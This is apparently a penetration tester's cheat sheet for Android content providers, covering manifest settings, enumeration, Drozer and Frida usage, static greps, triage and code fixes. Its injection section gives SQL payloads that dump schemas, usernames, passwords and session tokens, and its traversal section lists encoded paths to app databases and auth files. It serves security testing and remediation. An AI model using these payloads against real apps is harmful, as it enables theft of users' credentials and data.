# 27 — Content Providers — Cheat Sheet

## URI anatomy

```
content://com.example.app.provider/users/42?limit=1
\______/   \_____________________/ \_____/ \_____/
 scheme          authority           path    query
                (OS routes on this)  (provider parses)
```

## Manifest attributes

| Attribute | Default | Note |
|---|---|---|
| `android:authorities` | required | `;`-separated; unique device-wide |
| `android:exported` | `true` if targetSdk ≤ 16, else `false` | The key attribute |
| `android:permission` | none | Sets read+write |
| `android:readPermission` | none | `query`, `openFile("r")` |
| `android:writePermission` | none | `insert`/`update`/`delete`/`openFile("w")` |
| `android:grantUriPermissions` | `false` | `true` = any URI grantable |
| `android:enabled` | `true` | |
| `android:multiprocess` | `false` | Instance per client process |
| `android:initOrder` | `0` | Higher first |
| `android:process` | app process | Changes Frida target |
| `android:directBootAware` | `false` | Reachable before unlock |

## `<grant-uri-permission>` path matching

| Attribute | Rule |
|---|---|
| `android:path` | exact match |
| `android:pathPrefix` | starts-with |
| `android:pathPattern` | `*` = repeat previous char, `.*` = anything (NOT a regex) |
| `android:pathSuffix` | ends-with (API 31+) |
| `android:pathAdvancedPattern` | real regex (API 31+) |

## Protection levels

| Level | Effective protection |
|---|---|
| `normal` | None — auto-granted to any app |
| `dangerous` | Weak — one user prompt |
| `signature` | Strong |
| `signature\|privileged` | Strong |

## Provider contract

| Method | Auto permission check |
|---|---|
| `query(Uri, String[], String, String[], String)` | read |
| `insert(Uri, ContentValues)` | write |
| `update(Uri, ContentValues, String, String[])` | write |
| `delete(Uri, String, String[])` | write |
| `openFile(Uri, String mode)` | read or write per mode |
| `openAssetFile(Uri, String mode)` | read or write per mode |
| `getType(Uri)` | **none** |
| `call(String, String, Bundle)` | **none** |

## Query parameter → SQL mapping

| Param | SQL position | Bindable? |
|---|---|---|
| `projection` | `SELECT <...>` | No |
| `selection` | `WHERE <...>` | Only with `?` + `selectionArgs` |
| `selectionArgs` | bound values | Yes |
| `sortOrder` | `ORDER BY <...>` | No |

## `openFile` modes

| Mode | Flags |
|---|---|
| `r` | `MODE_READ_ONLY` |
| `w` | `WRITE_ONLY \| CREATE \| TRUNCATE` |
| `wa` | `WRITE_ONLY \| CREATE \| APPEND` |
| `rw` | `READ_WRITE \| CREATE` |
| `rwt` | `READ_WRITE \| CREATE \| TRUNCATE` |

## URI grant flags

| Flag | Hex |
|---|---|
| `FLAG_GRANT_READ_URI_PERMISSION` | `0x00000001` |
| `FLAG_GRANT_WRITE_URI_PERMISSION` | `0x00000002` |
| `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` | `0x00000040` |
| `FLAG_GRANT_PREFIX_URI_PERMISSION` | `0x00000080` |

## FileProvider `<paths>` elements

| Element | Root |
|---|---|
| `<files-path>` | `getFilesDir()` |
| `<cache-path>` | `getCacheDir()` |
| `<external-path>` | `getExternalStorageDirectory()` |
| `<external-files-path>` | `getExternalFilesDir(null)` |
| `<external-cache-path>` | `getExternalCacheDir()` |
| `<external-media-path>` | `getExternalMediaDirs()[0]` |
| `<root-path>` | `/` — **finding** |

URI form: `content://<authority>/<name>/<path relative to root>`

## Enumeration

```bash
adb shell dumpsys package providers
adb shell dumpsys package <pkg> | sed -n '/Provider Resolver Table/,/^ *$/p'
adb shell dumpsys package <pkg> | grep -A12 "Provider{"
adb shell dumpsys activity providers
adb shell dumpsys activity permissions        # live URI grants
```

```bash
# every third-party authority on the device
for p in $(adb shell pm list packages -3 | sed 's/package://'); do
  adb shell dumpsys package "$p" | grep -oE 'authority=[^ ]+' | sed "s|^|$p |"
done
```

## `content` command

```bash
content query   --uri content://<auth>/<path>
content query   --uri <uri> --projection "col1,col2"
content query   --uri <uri> --where "1=1"
content query   --uri <uri> --sort "_id DESC"
content query   --uri <uri> --user 0
content insert  --uri <uri> --bind k:s:v --bind n:i:1 --bind f:b:true
content update  --uri <uri> --bind k:s:v --where "_id=1"
content delete  --uri <uri> --where "_id=1"
content call    --uri content://<auth> --method <m> --arg <a> --extra k:s:v
content read    --uri <uri> > out.bin
content write   --uri <uri> < in.bin
content gettype --uri <uri>
```

Bind types: `s` string · `i` int · `l` long · `f` float · `d` double · `b` boolean · `n` null

## Response oracle

| Response | Meaning |
|---|---|
| `SecurityException: ... requires <perm>` | Exists, reachable, needs a permission |
| `SecurityException: ... not exported from UID` | Exists, not exported |
| `IllegalArgumentException: Unknown URI` | **Past the permission check**; wrong path only |
| `Unable to resolve content provider` | No such authority, or hidden by package visibility |
| Empty cursor with headers | Reached the data, no matching rows |

## Injection payloads

```bash
# schema dump via projection
--projection "(SELECT group_concat(name||' '||sql, char(10)) FROM sqlite_master) AS s"

# data dump via projection
--projection "(SELECT group_concat(username||':'||password, char(10)) FROM users) AS s"

# selection
--where "1=1"
--where "1=0 UNION SELECT _id, username, password FROM users --"

# sortOrder boolean oracle (abs of INT64_MIN throws)
--sort "CASE WHEN (SELECT count(*) FROM users)>0 THEN _id ELSE abs(-9223372036854775808) END"

# blind char extraction via sortOrder
--sort "CASE WHEN (SELECT substr(token,1,1) FROM session)='e' THEN _id ELSE abs(-9223372036854775808) END"
```

## Traversal payloads

```
..%2F..%2Fdatabases%2Fapp.db
..%2F..%2Fdatabases%2Fapp.db-wal
..%2F..%2Fshared_prefs%2Fauth.xml
..%2F..%2Ffiles%2Fsession.json
%2Fdata%2Fdata%2F<pkg>%2Fdatabases%2Fapp.db
%2e%2e%2f%2e%2e%2fshared_prefs%2fauth.xml
....//....//databases//app.db
..%252F..%252Fdatabases%252Fapp.db
```

High-value targets: `shared_prefs/*.xml`, `databases/*.db` + `-wal` + `-journal`, `files/`,
`cache/`, `no_backup/`, `/proc/self/maps`.

## Drozer

```
run app.provider.info
run app.provider.info -a <pkg>
run app.provider.info -p null
run app.provider.finduri <pkg>
run app.provider.query <uri> --vertical
run app.provider.query <uri> --projection "* FROM sqlite_master WHERE '1'='1"
run app.provider.query <uri> --selection "1=1"
run app.provider.insert <uri> --string k v --integer n 1
run app.provider.update <uri> --selection "_id=1" --string k v
run app.provider.delete <uri> --selection "_id=1"
run app.provider.read <uri>
run app.provider.download <uri> /tmp/out
run scanner.provider.finduris  -a <pkg>
run scanner.provider.injection -a <pkg>
run scanner.provider.sqltables -a <pkg>
run scanner.provider.traversal -a <pkg>
```

No Drozer module tests `call()` or sort-order injection. Do both by hand.

## Frida one-liners

```javascript
// dump every registered route
Java.perform(function(){var U=Java.use("android.content.UriMatcher");
U.addURI.implementation=function(a,p,c){console.log("content://"+a+"/"+p+" -> "+c);
return this.addURI(a,p,c);};});
```

```javascript
// see the compiled SQL
Java.perform(function(){var D=Java.use("android.database.sqlite.SQLiteDatabase");
D.rawQuery.overload("java.lang.String","[Ljava.lang.String;").implementation=
function(s,a){console.log("[sql] "+s);return this.rawQuery(s,a);};});
```

```javascript
// log the real file opened
Java.perform(function(){var P=Java.use("android.os.ParcelFileDescriptor");
P.open.overload("java.io.File","int").implementation=function(f,m){
console.log("[open] "+f.getCanonicalPath()+" mode="+m);return this.open(f,m);};});
```

```javascript
// watch the RPC surface
Java.perform(function(){var C=Java.use("android.content.ContentProvider");
C.call.overload("java.lang.String","java.lang.String","android.os.Bundle").implementation=
function(m,a,e){console.log("[call] "+m+" arg="+a);return this.call(m,a,e);};});
```

## Static greps

```bash
grep -rln "extends ContentProvider" out/sources/
grep -rn  "public Bundle call" out/sources/
grep -rn  "rawQuery\|execSQL" out/sources/
grep -rnE "\"[^\"]*(SELECT|WHERE|ORDER BY)[^\"]*\" *\+" out/sources/
grep -rn  "ParcelFileDescriptor openFile\|openAssetFile" out/sources/
grep -rn  "getLastPathSegment\|getPathSegments" out/sources/
grep -rn  "getCanonicalPath" out/sources/          # absence is the finding
grep -rn  "getParcelableExtra" out/sources/ | grep -i intent
grep -rn  "FLAG_GRANT_READ_URI_PERMISSION\|grantUriPermission(" out/sources/
grep -rn  "SQLiteQueryBuilder\|setProjectionMap\|setStrict" out/sources/
grep -rhoE "content://[A-Za-z0-9._/#*-]+" out/sources/ work/res/ | sort -u
grep -rn  "root-path" work/res/xml/
grep -A8  '<provider' work/AndroidManifest.xml
aapt2 dump xmltree target.apk --file AndroidManifest.xml | grep -A20 "E: provider"
```

`(type 0x12)0xffffffff` = `true`, `(type 0x12)0x0` = `false` in `aapt2` output.

## Triage decision table

| exported | permission | protectionLevel | Verdict |
|---|---|---|---|
| `false` | any | any | Not reachable cross-UID |
| `true` | none | — | Finding |
| `true` | yes | `normal` | Finding |
| `true` | yes | `dangerous` | Weak finding |
| `true` | yes | `signature` | Acceptable (check key sharing) |
| `true` | read only | — | Writes unprotected — separate finding |

## Fixes

```java
// injection
SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
qb.setTables("t");
qb.setProjectionMap(PROJECTION_MAP);
qb.setStrict(true);
```

```java
// traversal
String base = baseDir.getCanonicalPath() + File.separator;   // trailing separator matters
if (!target.getCanonicalPath().startsWith(base)) throw new SecurityException();
```

```java
// call() / caller identity
int uid = Binder.getCallingUid();
if (uid != Process.myUid()
    && pm.checkSignatures(Process.myUid(), uid) != PackageManager.SIGNATURE_MATCH) {
    throw new SecurityException();
}
```

```xml
<!-- exposure -->
<permission android:name="com.x.permission.DATA" android:protectionLevel="signature" />
<provider android:exported="true"
          android:readPermission="com.x.permission.DATA"
          android:writePermission="com.x.permission.DATA" />
```

```xml
<!-- correct FileProvider -->
<provider android:name="androidx.core.content.FileProvider"
          android:authorities="${applicationId}.fileprovider"
          android:exported="false"
          android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS"
               android:resource="@xml/file_paths" />
</provider>
```

## Version matrix

| API | Change |
|---|---|
| 16 | Last version with `exported` defaulting to `true` |
| 17 | `exported` defaults to `false` |
| 19 | SAF, `DocumentsProvider`, persistable grants |
| 21 | `FLAG_GRANT_PREFIX_URI_PERMISSION` |
| 23 | Runtime permissions |
| 24 | `FileUriExposedException`; `MODE_WORLD_*` throws |
| 26 | `Bundle`-based `query()` |
| 29 | Scoped storage |
| 30 | Package visibility filtering |
| 31 | Explicit `exported` for filtered components; `pathSuffix`, `pathAdvancedPattern` |
| 33 | `getTypeAnonymous()` |
| 34 | Tighter implicit intent / `PendingIntent` rules |

## Rules

- `adb shell` is UID 2000. Reproduce from an ordinary app before reporting.
- Test **all three** injection points.
- Always fuzz through `acquireUnstableContentProviderClient`.
- Pull `.db-wal` and `.db-journal` alongside `.db`.
- Read the **merged** manifest, not the source one.
- `IllegalArgumentException: Unknown URI` means you are past the permission check.
